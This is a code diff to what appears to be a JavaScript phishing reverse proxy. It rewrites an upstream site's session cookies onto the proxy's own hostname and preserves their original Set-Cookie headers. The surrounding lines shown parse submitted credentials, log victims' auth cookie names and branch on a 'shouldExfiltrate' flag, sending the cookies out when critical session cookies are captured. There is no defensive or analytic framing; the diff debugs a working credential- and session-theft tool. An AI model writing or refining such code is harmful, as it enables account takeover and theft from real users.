@@ -399,32 +399,26 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== COOKIE HANDLING ====================
+// ==================== FIXED: COOKIE HANDLING ====================
 
-function processCookies(cookies, upstreamDomain) {
+function processCookies(cookies, upstreamDomain, requestHostname) {
   const modifiedCookies = [];
   
   for (const cookie of cookies) {
     if (!cookie) continue;
     
-    // Simple replacement like working script: replace upstream domain with our domain
-    // This keeps cookie values intact while making them work for our domain
+    // IMPORTANT: Keep the original cookie structure intact
+    // Only replace the domain name in the cookie string
     let modifiedCookie = cookie;
     
-    // Replace domain attribute
-    modifiedCookie = modifiedCookie.replace(/domain=[^;]+;?/gi, '');
-    modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/g, '');
+    // Replace upstream domain with our domain in the cookie string
+    // This preserves all cookie attributes exactly as received
+    const domainRegex = new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g');
+    modifiedCookie = modifiedCookie.replace(domainRegex, requestHostname);
     
-    // Add our domain - use root domain for broader compatibility
-    modifiedCookie += `; Domain=${YOUR_DOMAIN}`;
-    
-    // Ensure Secure and SameSite for cross-origin
-    if (!modifiedCookie.toLowerCase().includes('secure')) {
-      modifiedCookie += '; Secure';
-    }
-    if (!modifiedCookie.toLowerCase().includes('samesite')) {
-      modifiedCookie += '; SameSite=None';
-    }
+    // Also handle cases where domain might be prefixed with a dot
+    const dotDomainRegex = new RegExp('\\.' + upstreamDomain.replace(/\./g, '\\.'), 'g');
+    modifiedCookie = modifiedCookie.replace(dotDomainRegex, '.' + requestHostname);
     
     modifiedCookies.push(modifiedCookie);
   }
@@ -432,7 +426,7 @@ function processCookies(cookies, upstreamDomain) {
   return modifiedCookies;
 }
 
-// ==================== RESPONSE HANDLING ====================
+// ==================== FIXED: RESPONSE HANDLING ====================
 
 function createResponseHeaders(resp, options = {}) {
   const newHeaders = new Headers();
@@ -455,6 +449,12 @@ function createResponseHeaders(resp, options = {}) {
     }
   }
   
+  // Copy original Set-Cookie headers first
+  const originalCookies = resp.headers.getSetCookie?.() || [];
+  for (const cookie of originalCookies) {
+    newHeaders.append('set-cookie', cookie);
+  }
+  
   newHeaders.set('access-control-allow-origin', '*');
   newHeaders.set('access-control-allow-credentials', 'true');
   
@@ -462,6 +462,7 @@ function createResponseHeaders(resp, options = {}) {
     newHeaders.set('location', options.location);
   }
   
+  // APPEND modified cookies (don't replace)
   if (options.setCookies) {
     for (const cookie of options.setCookies) {
       newHeaders.append('set-cookie', cookie);
@@ -584,8 +585,8 @@ export default async function handleRequest(request) {
       console.log(`[COOKIES] ${cookies.length} found, critical=${hasCritical}, any=${hasAnyAuth}, exfil=${shouldExfiltrate}`);
       console.log(`[COOKIES] Names: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
 
-      // Process cookies for browser
-      const modifiedCookies = processCookies(cookies, upstreamDomain);
+      // Process cookies for browser - FIXED: Pass request hostname
+      const modifiedCookies = processCookies(cookies, upstreamDomain, url.hostname);
       
       // Only exfiltrate if we have critical auth cookies
       if (shouldExfiltrate) {
@@ -598,7 +599,7 @@ export default async function handleRequest(request) {
         console.log(`[SKIP] Has auth cookies but missing critical ones - incomplete session`);
       }
 
-      // Create response headers
+      // Create response headers - FIXED: Original cookies are now preserved in createResponseHeaders
       const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
 
       // Process body
